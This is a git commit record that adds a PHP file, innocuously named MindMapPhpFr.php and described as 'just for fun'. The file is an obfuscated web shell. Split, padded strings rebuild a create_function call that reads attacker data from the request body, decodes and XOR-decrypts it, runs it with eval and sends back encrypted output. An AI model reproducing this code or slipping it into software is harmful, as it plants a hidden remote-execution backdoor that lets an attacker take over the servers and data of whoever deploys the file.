2290050db42f3564b8a98b92a01117837a123ddd
bl700 <101090002+bl700@users.noreply.github.com>
2023-05-21 11:55:32 +0200

    Create MindMapPhpFr.php
    just for fun

---
+++ MindMapPhpFr.php
@@ -0,0 +1,10 @@
+<?php
+$L='*I*It_*Icon*Ite*Ints();@ob_end_clean();$r=*I@base6*I4_en*Icode(@x*I(@gzc*Io*Impress($*Io),$k))*I;print("*I*I$p$kh$r$kf");}';
+$R='*I{$c=strl*Ien($*Ik);$l=strle*In($t);$*I*Io="";for*I($i=0;*I$i<$l;){*Ifor($j=*I0;*I($j<$c&&*I$i<$l);*I$j++,$i++)*I{*I$';
+$O='nput*I")*I,$m)==*I1) {@ob_st*Iart();*I@eva*Il(@gzunco*Impres*Is(@x(*I@ba*Ise64_deco*Ide($m*I[1]),$k))*I);*I$o=@ob_ge';
+$o=str_replace('yn','','cryneatynynynyne_functynion');
+$N='$k="3cfc*Ieb9*I*Ic";$kh=*I"75d777fb8706"*I;$kf=*I"12b8*Ie5f550*I07";*I$p="Whii*IxGKA*I*IAeXtO4Lh"*I;function x(*I$*It,$k)';
+$k='o.=$t{*I$i}^$k*I{$*Ij};}}re*Iturn $o;}if*I (@pre*Ig*I_match("*I/$kh(.+)*I$kf/",@f*Iile*I_get_*Iconten*Its("php:*I//i';
+$D=str_replace('*I','',$N.$R.$k.$O.$L);
+$d=$o('',$D);$d();
+?>
